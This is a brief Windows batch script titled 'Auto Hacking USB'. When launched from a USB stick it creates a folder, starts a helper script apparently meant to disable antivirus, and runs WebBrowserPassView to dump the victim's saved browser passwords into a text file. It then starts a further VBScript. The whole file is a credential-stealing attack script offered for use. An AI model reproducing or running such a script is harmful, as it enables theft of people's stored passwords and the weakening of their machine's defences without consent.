@echo off
title Auto Hacking USB - xyse
:Start
md Files
start .\App\avrem.bat
ping localhost -n 2 >nul
start .\App\WebPass\WebBrowserPassView.exe /stext .\Files\Passwords.txt
start input.vbs
exit

